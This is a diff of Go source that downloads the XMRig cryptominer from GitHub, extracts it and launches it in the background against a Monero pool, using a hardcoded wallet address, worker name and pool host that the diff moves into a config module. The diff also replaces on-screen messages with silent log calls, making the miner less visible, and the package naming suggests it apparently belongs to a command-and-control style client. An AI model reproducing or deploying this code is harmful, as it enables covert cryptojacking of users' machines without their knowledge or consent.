@@ -3,25 +3,18 @@ package func_unix
 import (
 	"archive/zip"
 	"fmt"
+	"head/head_com/config_func"
 	"io"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 )
 
-const (
-	WALLET = "46FSLgdDKpUTGFgRtcATVRQGa4MXHeWTb4fevKr5dvdJKeVopaa5hh8VAzPeyQfRRpWhx7Wp9Fg7ocWPiUqXqEJgAo3iHiG"
-	WORKER = "sin"
-	POOL   = "xmr-eu.kryptex.network:7029"
-)
-
 var minerCmd *exec.Cmd
 var stopMiningChan = make(chan struct{})
 
 func downloadXMRig() error {
-	url := "https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-msvc-win64.zip"
 	destDir := "data_use/miner"
 	filename := filepath.Join(destDir, "xmrig.zip")
 
@@ -30,8 +23,9 @@ func downloadXMRig() error {
 		return fmt.Errorf("error creating directory: %v", err)
 	}
 
-	fmt.Println("⬇️ Downloading XMRig...")
-	resp, err := http.Get(url)
+	config_func.Log_append("Downloading XMRig")
+
+	resp, err := http.Get(config_func.Miner_github)
 	if err != nil {
 		return fmt.Errorf("error downloading XMRig: %v", err)
 	}
@@ -47,7 +41,8 @@ func downloadXMRig() error {
 	if err != nil {
 		return fmt.Errorf("error saving file: %v", err)
 	}
-	fmt.Println("Downloaded")
+
+	config_func.Log_append("Downloaded miner")
 
 	return nil
 }
@@ -91,7 +86,8 @@ func extractXMRig() error {
 			}
 		}
 	}
-	fmt.Println("Extracted")
+
+	config_func.Log_append("Extracted miner")
 
 	return nil
 }
@@ -107,13 +103,13 @@ func StartMining() error {
 		}
 	}
 
-	fmt.Println("🚀 Starting mining in background...")
+	config_func.Log_append("Starting mining in background")
 
 	cmd := exec.Command(xmrigPath,
-		"-o", POOL,
-		"-u", WALLET,
+		"-o", config_func.POOL,
+		"-u", config_func.WALLET,
 		"-k",
-		"-p", WORKER,
+		"-p", config_func.WORKER,
 		"-a", "rx/0",
 	)
 
@@ -124,20 +120,20 @@ func StartMining() error {
 	go func() {
 		err := cmd.Start()
 		if err != nil {
-			log.Fatalf("Error starting mining: %v", err)
+			config_func.Log_append("Error starting mining")
 		}
 		err = cmd.Wait()
 		if err != nil {
-			log.Printf("Mining process terminated: %v", err)
+			config_func.Log_append("Mining process terminated")
 		}
 	}()
 
 	go func() {
 		<-stopMiningChan
 		if err := cmd.Process.Kill(); err != nil {
-			log.Printf("Error stopping mining: %v", err)
+			config_func.Log_append("Error stopping mining")
 		} else {
-			fmt.Println("Miner stopped.")
+			config_func.Log_append("Miner stopped")
 		}
 	}()
 
